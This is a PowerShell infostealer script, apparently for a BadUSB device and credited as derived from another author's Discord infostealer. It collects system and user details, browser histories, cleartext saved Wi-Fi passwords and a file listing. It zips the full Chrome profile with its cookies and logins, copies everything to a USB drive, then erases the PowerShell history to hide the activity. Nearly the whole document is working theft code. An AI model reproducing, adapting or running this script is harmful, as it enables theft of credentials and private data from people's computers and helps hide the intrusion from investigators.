#This Code is based on Beige Worm InfoStealer: https://github.com/beigeworm/BadUSB-Files-For-FlipperZero/tree/main/Discord-Infostealer
#And 

#Made by 888o

# --- SYSTEM INFO, BROWSER HISTORY, WIFI PASSWORDS, STORED PASSWORDS, AND FILE COLLECTION SCRIPT ---
# --- SYSTEM INFO GATHERING ---
function Collect-SystemInfo {
    Get-ComputerInfo | Out-File -FilePath "$env:TEMP\SystemInfo.txt" -Encoding ASCII
}

# --- BROWSER HISTORY COLLECTION ---
function Get-ChromeHistory {
    $chrome_history_path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    if (Test-Path $chrome_history_path) {
        $query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50"
        $chrome_history = Invoke-SqliteQuery -dbPath $chrome_history_path -query $query
        return $chrome_history
    }
    return "No Google Chrome history found."
}

function Get-OperaGXHistory {
    $opera_history_path = "$env:APPDATA\Opera Software\Opera GX Stable\History"
    if (Test-Path $opera_history_path) {
        $query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50"
        $opera_history = Invoke-SqliteQuery -dbPath $opera_history_path -query $query
        return $opera_history
    }
    return "No Opera GX history found."
}

function Get-FirefoxHistory {
    $firefox_profile_path = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release" | Select-Object -First 1
    $firefox_history_path = Join-Path $firefox_profile_path "places.sqlite"
    if (Test-Path $firefox_history_path) {
        $query = "SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 50"
        $firefox_history = Invoke-SqliteQuery -dbPath $firefox_history_path -query $query
        return $firefox_history
    }
    return "No Mozilla Firefox history found."
}

function Get-IEHistory {
    $ie_history = @()
    $shell = New-Object -ComObject Shell.Application
    $folder = $shell.Namespace('shell:::{FDD39AD6-9A8B-4F87-9B2F-7B2E3D572D65}')  
    if ($folder) {
        foreach ($item in $folder.Items()) {
            $ie_history += [PSCustomObject]@{
                Name = $item.Name
                Path = $item.Path
                ModifiedDate = $item.ModifyDate
            }
        }
        if ($ie_history.Count -eq 0) {
            return "No Internet Explorer history found."
        }
        return $ie_history
    }
    return "No Internet Explorer history found."
}

# Function to invoke SQLite query
function Invoke-SqliteQuery {
    param (
        [string]$dbPath,
        [string]$query
    )
    $connectionString = "Data Source=$dbPath;Version=3;"
    $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
    $connection.Open()
    $command = $connection.CreateCommand()
    $command.CommandText = $query
    $reader = $command.ExecuteReader()

    $results = @()
    while ($reader.Read()) {
        $row = @{}
        for ($i = 0; $i -lt $reader.FieldCount; $i++) {
            $row[$reader.GetName($i)] = $reader[$i]
        }
        $results += New-Object PSObject -Property $row
    }
    $connection.Close()
    return $results
}

# Function to save history to a file
function Save-HistoryToFile {
    param (
        [string]$historyData,
        [string]$fileName
    )
    $filePath = "$env:TEMP\$fileName"
    $historyData | Out-File -FilePath $filePath -Encoding ASCII
    return $filePath
}

# --- MAIN SCRIPT EXECUTION ---
$chrome_history = Get-ChromeHistory
$opera_history = Get-OperaGXHistory
$firefox_history = Get-FirefoxHistory
$ie_history = Get-IEHistory

# Save histories to temp files
$chrome_file = Save-HistoryToFile -historyData $chrome_history -fileName "Chrome_History.txt"
$opera_file = Save-HistoryToFile -historyData $opera_history -fileName "OperaGX_History.txt"
$firefox_file = Save-HistoryToFile -historyData $firefox_history -fileName "Firefox_History.txt"
$ie_file = Save-HistoryToFile -historyData $ie_history -fileName "IE_History.txt"

# --- MASS STORAGE EXFIL ---
$Date = Get-Date -Format yyyy-MM-dd
$Time = Get-Date -Format hh-mm-ss

# Create a stats.txt file with system info and wifi passwords
"System Info:" > "$env:TEMP\stats.txt"
Get-CimInstance -ClassName Win32_ComputerSystem >> "$env:TEMP\stats.txt"
Get-LocalUser >> "$env:TEMP\stats.txt"
Get-LocalUser | Where-Object -Property PasswordRequired -Match false >> "$env:TEMP\stats.txt"
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct >> "$env:TEMP\stats.txt"
Get-CimInstance -ClassName Win32_QuickFixEngineering >> "$env:TEMP\stats.txt"
(netsh wlan show profiles) | Select-String ':(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\W+:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> "$env:TEMP\stats.txt"
dir env: >> "$env:TEMP\stats.txt"
Get-ComputerInfo >> "$env:TEMP\stats.txt"
Get-Service >> "$env:TEMP\stats.txt"
Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> "$env:TEMP\stats.txt"
Get-NetTCPConnection | Where-Object -Property State -Match Listen >> "$env:TEMP\stats.txt"
Get-NetTCPConnection | Select-Object -Property * >> "$env:TEMP\stats.txt"
Get-ChildItem -Path $env:USERPROFILE -Include *.txt, *.doc, *.docx, *.pptx, *.xlsx, *.pdf, *.jpg, *.png, *.mp3, *.mp4, *.zip, *.rar -Recurse >> "$env:TEMP\stats.txt"

# Compress Chrome data
Compress-Archive -Path "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\*" -DestinationPath "$env:TEMP\ChromeData.zip"

# Run MassStorage exfiltration
$DriveLetter = Get-Disk | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter
$DestinationPath = "${DriveLetter}:\${Date}\"
New-Item -ItemType Directory -Force -Path $DestinationPath
Move-Item -Path "$env:TEMP\stats.txt", "$env:TEMP\ChromeData.zip" -Destination $DestinationPath
Move-Item -Path $chrome_file, $opera_file, $firefox_file, $ie_file -Destination $DestinationPath
Remove-Item "$env:TEMP\stats.txt", "$env:TEMP\ChromeData.zip"

# Clean up PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
exit
